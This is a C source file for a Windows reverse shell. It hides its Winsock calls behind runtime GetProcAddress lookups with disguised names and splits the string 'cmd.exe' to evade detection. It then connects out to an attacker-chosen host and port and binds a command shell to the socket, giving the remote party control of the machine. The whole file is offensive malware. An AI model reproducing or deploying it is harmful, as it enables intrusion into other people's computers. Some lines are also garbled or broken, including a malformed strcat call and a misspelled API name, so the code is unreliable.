#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024
//Define struct of calls
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequired,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af, int type, int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int (WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int (WSAAPI* WSACLEANUP)(void);

void flee(char* who, int why) {
    // Obtain the handle of the module the call address is present in 
    HMODULE hws2_32 = LoadLibraryW(L"ws2_32");

    // Pointer to API call address
        WSACONNECT WakaKonekt = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect"); // First is our structure, followed by the name and then getting a pointer to the call from the relevant libary.
        WSASTARTUP WakaStark = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartUp");
        WSASOCKETA WakaSokiwoki = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
        INET_ADDR whi_neti = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
        HTONS kilogremz = (HTONS) GetProcAddress(hws2_32, "htons");
        CLOSESOCKET clozwoket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
        WSACLEANUP wakakleen = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup");
        SOCKET sokurt;
        struct sockaddr_in addr;
        WSADATA version;
        WakaStark(MAKEWORD(2,2), &version);
        sokurt = WakaSokiwoki(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = whi_neti(who);
        addr.sin_port = kilogremz(why);

        if (WakaKonekt(sokurt, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            clozwoket(sokurt);
            wakakleen();
        } else {
            printf("Connected to %s:%d\\n", who, why);

            char sessy1[] = "cm";
            char sessy2[] = "d.exe";
            char* Powah = strcat(sessy1, sessy2_yoink_fail:));
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sokurt;
            CreateProcess(NULL, Powah, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        flee(argv[1], port);
    }
    else {
        char cheese[] = "x.x.x.x";
        int pie = 1337;
        flee(cheese, pie);
    }
    return 0;
} 


